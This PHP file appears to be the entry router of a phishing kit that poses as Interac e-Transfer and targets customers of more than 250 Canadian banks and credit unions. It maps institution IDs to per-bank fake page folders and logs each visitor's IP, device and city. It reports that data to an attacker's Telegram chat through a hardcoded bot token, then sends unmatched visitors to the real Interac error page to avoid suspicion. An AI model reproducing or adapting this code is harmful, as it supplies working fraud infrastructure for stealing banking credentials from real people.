<?php
declare(strict_types=1);

// ---------------- START OUTPUT BUFFER ----------------
ob_start();

// ---------------- CONFIG ----------------
$BOT_TOKEN      = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$CHAT_ID        = '-1002922644009';
$BASE_DIR       = __DIR__;
$LOG_DIR        = "$BASE_DIR/logs";
$DATA_DIR       = "$BASE_DIR/data";
$COUNTERS_FILE  = "$DATA_DIR/counters.json";

// Ensure directories exist
@mkdir($LOG_DIR, 0755, true);
@mkdir($DATA_DIR, 0755, true);

// ---------------- HELPERS ----------------
function safe($v) { return htmlspecialchars((string)$v, ENT_QUOTES|ENT_SUBSTITUTE,'UTF-8'); }
function now() { return date('Y-m-d H:i:s'); }
function log_event($msg){ global $LOG_DIR; @file_put_contents("$LOG_DIR/access.log", "[".now()."] $msg\n", FILE_APPEND|LOCK_EX); }
function log_error($msg){ global $LOG_DIR; @file_put_contents("$LOG_DIR/error.log", "[".now()."] ERROR: $msg\n", FILE_APPEND|LOCK_EX); }
function load_json($f){ return (file_exists($f) && ($j=@json_decode(@file_get_contents($f), true))) ? $j : []; }
function save_json($f, $d){ $tmp=$f.'.tmp'; @file_put_contents($tmp, json_encode($d, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES), LOCK_EX); @rename($tmp, $f); }

function get_client_ip() {
    $ip_keys = ['HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
    $ip = 'UNKNOWN';

    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip_list = explode(',', $_SERVER[$key]);
            $potential_ip = trim($ip_list[0]);
            
            if (filter_var($potential_ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                 $ip = $potential_ip;
                 break;
            }
        }
    }
    
    if (strpos($ip, '::ffff:') === 0) {
        $ip = substr($ip, 7);
    }

    return $ip;
}

function send_telegram($bot, $chat, $text, $kb=null){
    $url = "https://api.telegram.org/bot{$bot}/sendMessage";
    $p = ['chat_id'=>$chat, 'text'=>$text, 'parse_mode'=>'HTML', 'disable_web_page_preview'=>true];
    if($kb) $p['reply_markup'] = json_encode(['inline_keyboard'=>$kb]);

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => 1,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_POSTFIELDS => $p
    ]);

    $r = curl_exec($ch);
    if($r === false) log_error("Telegram send failed: ".curl_error($ch));

    return $r;
}

// ---------------- BANK MAPPING & THEME ----------------
$bankMappings = [
    // ---------------- Major & National Banks ----------------
    "CA000001" => "bmo",
    "CA000002" => "scotiabank",
    "CA000003" => "rbc",
    "CA000004" => "td",
    "CA000006" => "nationalbank",
    "CA000010" => "cibc",
    "CA000030" => "canadianwesternbank",
    "CA000039" => "laurentian",
    "CA000219" => "atb",
    "CA000241" => "bankofamerica",
    "CA000320" => "pcfinancial",
    "CA000328" => "citibank",
    "CA000352" => "dcbank",
    "CA000374" => "motusbank",
    "CA000382" => "coastcapital",
    "CA000540" => "manulife",
    "CA000614" => "tangerine",
    "CA100621" => "peoples",
    "CA000809" => "eqbank",
    "CA000815" => "desjardins",
    "CA000837" => "meridian",
    "CA001000" => "alterna",
    "CA001001" => "bankofchina",
    "CA001002" => "canadianwesternbank",
    "CA001003" => "ctbc",
    "CA001005" => "firstnations",
    "CA001006" => "hanabank",
    "CA001007" => "icicican",
    "CA001009" => "motivefinancial",
    "CA001010" => "peacehillstrust",
    "CA001011" => "sbi",
    "CA001012" => "shinhan",
    "CA001013" => "vancity",
    "CA001014" => "versabank",
    "CA001015" => "wealthone",
    "CA001016" => "hsbc",
    "CA001110" => "fcdq",
    "CA002001" => "rbc",
    "CA002002" => "scotiabank",
    "CA002003" => "td",
    "CA002004" => "bmo",
    "CA002005" => "cibc",
    "CA002006" => "nationalbank",
    "CA002222" => "simplii",
    "CA000621" => "koho",
    "CA100002" => "tangerine",
    "CA100003" => "simplii",
    "CA111111" => "wealthsimple",
    "CA200001" => "accele",
    "CA200002" => "affinitycu",
    "CA200003" => "coastcapital",
    "CA200004" => "servus",
    "CA200005" => "meridian",
    "CA200006" => "prospera",
    "CA200007" => "duca",
    "CA200008" => "connectfirst",
    "CA200009" => "blueshore",
    "CA200010" => "alterna",
    "CA300001" => "peoplestrust",
    "CA300002" => "peoplesbank",
    "CA300003" => "concentra",
    "CA300004" => "communitytrust",
    "CA800809" => "laurentian",

    // ---------------- Alberta Credit Unions ----------------
    "CA080001" => "firstchoice",
    "CA080002" => "abcu",
    "CA080003" => "bowvalley",
    "CA080004" => "christian",
    "CA080005" => "connectfirst",
    "CA080006" => "lakeland",
    "CA080007" => "rocky",
    "CA080008" => "servus",
    "CA080009" => "vermilion",
    "CA080010" => "vision",

    // ---------------- British Columbia Credit Unions ----------------
    "CA090001" => "blueshore",
    "CA090002" => "bulkleyvalley",
    "CA090003" => "coastalcommunity",
    "CA090004" => "columbiavalley",
    "CA090005" => "communitysavings",
    "CA090006" => "compensationemployees",
    "CA090007" => "crestondistrict",
    "CA090008" => "envision",
    "CA090009" => "firstbc",
    "CA090010" => "greatervancouver",
    "CA090012" => "integris",
    "CA090013" => "interiorsavings",
    "CA090014" => "islandsavings",
    "CA090015" => "khalsa",
    "CA090016" => "kootenay",
    "CA090017" => "ladysmith",
    "CA090018" => "lakeview",
    "CA090019" => "nelsondistrict",
    "CA090020" => "northpeace",
    "CA090021" => "northernsavings",
    "CA090022" => "osoyoos",
    "CA090023" => "prospera",
    "CA090024" => "revelstoke",
    "CA090025" => "sascu",
    "CA090026" => "sharons",
    "CA090027" => "stellervista",
    "CA090028" => "summerland",
    "CA090029" => "sunshinecoast",
    "CA090030" => "valleyfirst",
    "CA090031" => "vancity",
    "CA090032" => "vancouverfirefighters",
    "CA090033" => "vantageone",
    "CA090034" => "williamslake",

    // ---------------- Manitoba Credit Unions ----------------
    "CA080011" => "access",
    "CA080012" => "assiniboine",
    "CA080013" => "belgianalliance",
    "CA080014" => "caissefinancial",
    "CA080015" => "cambrian",
    "CA080016" => "compass",
    "CA080017" => "flinflon",
    "CA080018" => "fusion",
    "CA080019" => "maxafinancial",
    "CA080020" => "median",
    "CA080021" => "niverville",
    "CA080022" => "outlook",
    "CA080023" => "rosenort",
    "CA080024" => "steinbach",
    "CA080025" => "stride",
    "CA080026" => "sunrise",
    "CA080027" => "swanvalley",
    "CA080028" => "westoba",
    "CA080029" => "winnipegpolice",

    // ---------------- Newfoundland & Labrador Credit Unions ----------------
    "888900801" => "communitycu_nl",
    "888900802" => "nlcu",
    "888900813" => "atlanticedge",
    "888900814" => "publicservicecu_nl",
    "888900816" => "atlanticedge",
    "888900817" => "hamiltonsoundcu",
    "888900820" => "easternedgecu",
    "888900821" => "reddykilowattcu",
    "888900828" => "venturecu",
    "CA100011" => "atlanticedge",
    "CA100012" => "atlanticedge",
    "CA100013" => "communitycu_nl",
    "CA100014" => "easternedgecu",
    "CA100015" => "hamiltonsoundcu",
    "CA100016" => "nlcu",
    "CA100017" => "publicservicecu_nl",
    "CA100018" => "reddykilowattcu",
    "CA100019" => "venturecu",

    // ---------------- Nova Scotia Credit Unions ----------------
    "888900016" => "capebretoncu",
    "888900019" => "newwaterfordcu",
    "888900027" => "dominioncu",
    "888900047" => "acadiancu",
    "888900049" => "inovacu",
    "888900052" => "stjosephscu",
    "888900057" => "eastcoastcu",
    "888900083" => "provincialgovernmentemployeecu",
    "888900106" => "northsydneycu",
    "888900193" => "coastalfinancialcu",
    "888900229" => "caissepopulairedeflare",
    "888900263" => "valleycu",
    "888900279" => "laharivercu",
    "888900288" => "teacherspluscu",
    "888900290" => "newrosscu",
    "888900333" => "victorycu",
    "888900335" => "cumberlandcolchester",
    "888900337" => "cua",
    "888900349" => "sydneycu",
    "888900354" => "glacebaycentralcu",
    "888900359" => "princesscu",

    // ---------------- Ontario Credit Unions ----------------
    "011900000" => "ststanislausstcasimirs",
    "021170000" => "resurrectioncu",
    "818280033" => "comtechfirecu",
    "818280041" => "hmecu",
    "818280052" => "tandiafinancialcu",
    "818280055" => "decommals",
    "818280067" => "theenergycu",
    "818280145" => "equitycu",
    "818280171" => "pathwisecu",
    "818280197" => "ukrainiancu",
    "818280219" => "zuni",
    "818280244" => "ganaraskafinancialcu",
    "818280289" => "thepolicecu",
    "818280340" => "yncu",
    "818280368" => "limestonecu",
    "818280376" => "thoroldcommunitycu",
    "818280384" => "frontlinefinancialcu",
    "818280519" => "decommalt",
    "818280602" => "sudburycu",
    "818280603" => "penfinancialcu",
    "818280618" => "baycu",
    "818280622" => "luminusfinancial",
    "818280630" => "oshawacommunitycu",
    "818280632" => "kawarthacu",
    "818280675" => "bcufinancial",
    "818280780" => "paramacu",
    "818280946" => "northernbirchcu",
    "818281018" => "copperfincu",
    "818281189" => "talkacu",
    "818281362" => "dundalkdistrictcu",
    "818281383" => "mainstreetcu",
    "818281444" => "kingstoncommunity",
    "818281449" => "northerncu",
    "818281463" => "finnishcu",
    "818281696" => "ontarioeducationalcu",
    "818281710" => "yourcu",
    "818281794" => "kindredcu",
    "818282027" => "oppacu",
    "818282087" => "liunalocal183cu",
    "818282089" => "taiwanesecu",
    "818282118" => "windsorfamilycu",
    "818282119" => "omniadirect",
    "818282120" => "southwestregionalcu",
    "818282126" => "motorcitycommunitycu",
    "818282145" => "icsavings",
    "818282188" => "goldenhorseshoecu",
    "818286282" => "librocu",
    "818286292" => "firstontariocu",
    "818286500" => "savenfinancial",
    "818903012" => "caissepopulairealliance",
    "846000120" => "rapport",
    "882802932" => "adjalacu",
    "888330005" => "alternasavings",
    "891433200" => "moyafinancial",
    "892500000" => "zlfc",
    "897810013" => "duca",

    // ---------------- Prince Edward Island Credit Unions ----------------
    "888900902" => "malpequebaycu",
    "888900904" => "consolidatedcu",
    "888900905" => "evangelinecentralcu",
    "888900907" => "provincialcu",
    "888900908" => "morellcu",
    "888900909" => "souriscu",
    "888900911" => "tignishcu",

    // ---------------- Saskatchewan Credit Unions ----------------
    "378601000" => "affinitycu_sk",
    "818890010" => "conexuscu",
    "818890450" => "cornerstonecu",
    "818890710" => "tcufinancialgroup",
    "818890810" => "weyburncu",
    "818890890" => "bengoughcu",
    "818890960" => "churchbridgecu",
    "818891070" => "prairiepridecu",
    "818891200" => "cypresscu",
    "818891350" => "innovationfederalcu",
    "818891440" => "brunosavingscu",
    "818891500" => "biggardistrictcu",
    "818891650" => "synergycu",
    "818891750" => "unitycu",
    "818891780" => "radiuscu",
    "818891850" => "crossroadscu",
    "818891940" => "dodslandcu",
    "818891990" => "edamcu",
    "818892010" => "laflechecu",
    "818892070" => "northvalleycu",
    "818892130" => "foamlakecu",
    "818892450" => "prairiecentrecu",
    "818892550" => "diamondnorthcu",
    "818892620" => "kerrobertcu",
    "818892780" => "sandhillscu",
    "818892840" => "luselandcu",
    "818893380" => "raymorecu",
    "818893490" => "rockglenkilldeercu",
    "818893540" => "saskatooncityemployeescu",
    "818893750" => "stgregorcu",
    "818893820" => "stoughtoncu",
    "818893920" => "turtlefordcu",
    "818894540" => "accentcu",
];

$bankColors = [
    // --- Major Banks ---
    "bmo" => "🔵", "scotiabank" => "🔴", "rbc" => "🟡", "td" => "🟢",
    "nationalbank" => "⚫️", "cibc" => "🔴", "laurentian" => "🔵", "atb" => "🔵",
    "desjardins" => "🟢", "tangerine" => "🟠", "simplii" => "⚫️", "eqbank" => "🟣",
    "meridian" => "🟢", "servus" => "🔵", "coastcapital" => "🔵", "vancity" => "🔵", "hsbc" => "🔴",

    // --- Other National & Online Banks ---
    "canadianwesternbank" => "🔵", "bankofamerica" => "🔴", "pcfinancial" => "🔴",
    "citibank" => "🔵", "dcbank" => "⚫️", "motusbank" => "🟠", "manulife" => "🟢",
    "peoples" => "🔵", "alterna" => "🔵", "bankofchina" => "🔴", "ctbc" => "🔴",
    "firstnations" => "🟢", "hanabank" => "🟢", "icicican" => "🟠", "motivefinancial" => "🟢",
    "peacehillstrust" => "🔵", "sbi" => "🔵", "shinhan" => "🔵", "versabank" => "🟣",
    "wealthone" => "🔴", "fcdq" => "🟢", "koho" => "🟠", "wealthsimple" => "🟣",
    "accele" => "🔵", "affinitycu" => "🔵", "prospera" => "🔵", "duca" => "🔵",
    "connectfirst" => "🔵", "blueshore" => "🔵", "peoplestrust" => "🔵", "peoplesbank" => "🔵",
    "concentra" => "🟢", "communitytrust" => "🔵",

    // --- Alberta CU ---
    "firstchoice" => "🔵", "abcu" => "🔵", "bowvalley" => "🟢", "christian" => "🔵", "lakeland" => "🟢",
    "rocky" => "🔵", "vermilion" => "🟢", "vision" => "🔵",
    
    // --- BC CU ---
    "bulkleyvalley" => "🟢", "coastalcommunity" => "🔵", "columbiavalley" => "🟢", "communitysavings" => "🔴",
    "compensationemployees" => "🔵", "crestondistrict" => "🟢", "envision" => "🔵", "firstbc" => "🔵",
    "greatervancouver" => "🔵", "integris" => "🟢", "interiorsavings" => "🟢", "islandsavings" => "🔵",
    "khalsa" => "🟠", "kootenay" => "🟢", "ladysmith" => "🔵", "lakeview" => "🔵", "nelsondistrict" => "🟢",
    "northpeace" => "🔵", "northernsavings" => "🔵", "osoyoos" => "🟢", "revelstoke" => "🟢", "sascu" => "🟢",
    "sharons" => "🔵", "stellervista" => "🔵", "summerland" => "🔵", "sunshinecoast" => "🟢", "valleyfirst" => "🔵",
    "vancouverfirefighters" => "🔴", "vantageone" => "🔵", "williamslake" => "🟢",
    
    // --- Manitoba CU ---
    "access" => "🟢", "assiniboine" => "🟢", "belgianalliance" => "🔴", "caissefinancial" => "🟢", "cambrian" => "🔵",
    "compass" => "🔵", "flinflon" => "🔵", "fusion" => "🟣", "maxafinancial" => "🔵", "median" => "🔵",
    "niverville" => "🔵", "outlook" => "🔵", "rosenort" => "🟢", "steinbach" => "🔵", "stride" => "🔵",
    "sunrise" => "🟠", "swanvalley" => "🟢", "westoba" => "🔵", "winnipegpolice" => "🔵",

    // --- NFL & LAB CU ---
    "communitycu_nl" => "🔵", "nlcu" => "🔵", "atlanticedge" => "🔵", "publicservicecu_nl" => "🔵",
    "hamiltonsoundcu" => "🟢", "easternedgecu" => "🔵", "reddykilowattcu" => "🔴", "venturecu" => "🟢",
    
    // --- NS CU ---
    "capebretoncu" => "🔵", "newwaterfordcu" => "🔵", "dominioncu" => "🔵", "acadiancu" => "🔵", "inovacu" => "🔵",
    "stjosephscu" => "🟢", "eastcoastcu" => "🔵", "provincialgovernmentemployeecu" => "🔵", "northsydneycu" => "🔵",
    "coastalfinancialcu" => "🔵", "caissepopulairedeflare" => "🔵", "valleycu" => "🟢", "laharivercu" => "🔵",
    "teacherspluscu" => "🟢", "newrosscu" => "🟢", "victorycu" => "🔵", "cumberlandcolchester" => "🔵",
    "cua" => "🔵", "sydneycu" => "🔵", "glacebaycentralcu" => "🔵", "princesscu" => "🔵",

    // --- Ontario CU ---
    "ststanislausstcasimirs" => "🔴", "resurrectioncu" => "🔵", "comtechfirecu" => "🔴", "hmecu" => "🔵",
    "tandiafinancialcu" => "🟢", "decommals" => "🔵", "theenergycu" => "🟢", "equitycu" => "🔵", "pathwisecu" => "🔵",
    "ukrainiancu" => "🟡", "zuni" => "🟣", "ganaraskafinancialcu" => "🟢", "thepolicecu" => "🔵", "yncu" => "🔵",
    "limestonecu" => "🟢", "thoroldcommunitycu" => "🔵", "frontlinefinancialcu" => "🔵", "decommalt" => "🔵",
    "sudburycu" => "🔵", "penfinancialcu" => "🟢", "baycu" => "🔵", "luminusfinancial" => "🔵", "oshawacommunitycu" => "🔵",
    "kawarthacu" => "🟢", "bcufinancial" => "🔵", "paramacu" => "🔵", "northernbirchcu" => "🟢", "copperfincu" => "🟠",
    "talkacu" => "🔵", "dundalkdistrictcu" => "🟢", "mainstreetcu" => "🔵", "kingstoncommunity" => "🟢",
    "northerncu" => "🔵", "finnishcu" => "🔵", "ontarioeducationalcu" => "🔵", "yourcu" => "🔵", "kindredcu" => "🟢",
    "oppacu" => "🔵", "liunalocal183cu" => "🔴", "taiwanesecu" => "🔴", "windsorfamilycu" => "🔵", "omniadirect" => "🔵",
    "southwestregionalcu" => "🔵", "motorcitycommunitycu" => "🔵", "icsavings" => "🟢", "goldenhorseshoecu" => "🟡",
    "librocu" => "🟢", "firstontariocu" => "🔵", "savenfinancial" => "🟢", "caissepopulairealliance" => "🟢",
    "rapport" => "🔵", "adjalacu" => "🟢", "alternasavings" => "🔵", "moyafinancial" => "🔴", "zlfc" => "🔴",

    // --- PEI CU ---
    "malpequebaycu" => "🟢", "consolidatedcu" => "🔵", "evangelinecentralcu" => "🟢", "provincialcu" => "🔵",
    "morellcu" => "🟢", "souriscu" => "🔵", "tignishcu" => "🟢",

    // --- SK CU ---
    "affinitycu_sk" => "🔵", "conexuscu" => "🔵", "cornerstonecu" => "🟢", "tcufinancialgroup" => "🔵", "weyburncu" => "🟢",
    "bengoughcu" => "🟢", "churchbridgecu" => "🔵", "prairiepridecu" => "🟢", "cypresscu" => "🟢", "innovationfederalcu" => "🔵",
    "brunosavingscu" => "🟢", "biggardistrictcu" => "🟢", "synergycu" => "🟢", "unitycu" => "🟢", "radiuscu" => "🟠",
    "crossroadscu" => "🔵", "dodslandcu" => "🟢", "edamcu" => "🟢", "laflechecu" => "🟢", "northvalleycu" => "🟢",
    "foamlakecu" => "🟢", "prairiecentrecu" => "🟢", "diamondnorthcu" => "🔵", "kerrobertcu" => "🟢", "sandhillscu" => "🟢",
    "luselandcu" => "🟢", "raymorecu" => "🟢", "rockglenkilldeercu" => "🟢", "saskatooncityemployeescu" => "🔵",
    "stgregorcu" => "🟢", "stoughtoncu" => "🟢", "turtlefordcu" => "🟢", "accentcu" => "🔵",
];

// ---------------- SCRIPT LOGIC ----------------
$ip = get_client_ip();
$submittedId  = strtoupper(trim($_GET['fiid'] ?? $_POST['fiid'] ?? ''));
$displayLabel = safe($_GET['bank'] ?? $_POST['bank'] ?? 'Unknown');
$folder = $bankMappings[$submittedId] ?? strtolower($displayLabel);

log_event("Access attempt with fiid={$submittedId}, bank={$displayLabel}, IP={$ip}");

// Update counters (now tracks per-IP per-bank)
$counters = load_json($COUNTERS_FILE);
$counters['total_visits'] = ($counters['total_visits'] ?? 0) + 1;
@$counters['banks_by_ip'][$folder][$ip]++;
$visitCountForIp = (int)@$counters['banks_by_ip'][$folder][$ip];
save_json($COUNTERS_FILE, $counters);

// Gather environment info for Telegram
$ua = safe($_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN');
$device = preg_match('/iPhone|iPad/i',$ua)?'iOS':(preg_match('/Android/i',$ua)?'Android':'Desktop');
$geo_city = 'Unknown';
if($ip !== 'UNKNOWN'){
    $geo_json = @file_get_contents("https://ipwhois.app/json/".urlencode($ip));
    if ($geo_json) {
        $g = json_decode($geo_json, true);
        if(is_array($g) && isset($g['city'])) $geo_city = safe($g['city']);
    }
}

// Prepare and send concise, color-coded Telegram message
$colorEmoji = $bankColors[$folder] ?? '🏦';
$folderUpper = strtoupper($folder);
$msg  = "{$colorEmoji} <b>{$folderUpper}</b> SELECTED {$colorEmoji}\n\n";
$msg .= "› <b></b> <code>{$device}</code>\n";
$msg .= "› <b></b> <code>{$geo_city}</code>\n";
$msg .= "› <b></b> Count:  <code>{$visitCountForIp}</code>\n\n";
$msg .= "{$colorEmoji} <b>{$folderUpper}</b> SELECTED {$colorEmoji}\n";

send_telegram($BOT_TOKEN, $CHAT_ID, $msg);

// Redirect user to the appropriate bank page
if (!empty($submittedId) && isset($bankMappings[$submittedId])) {
    $folder = $bankMappings[$submittedId];
    $redirectUrl = "/access/{$folder}/index.php";
    header("Location: $redirectUrl");
    exit;
}

// Fallback redirect for unknown IDs or missing files
header("Location: https://etransfer.interac.ca/error");
exit;
?>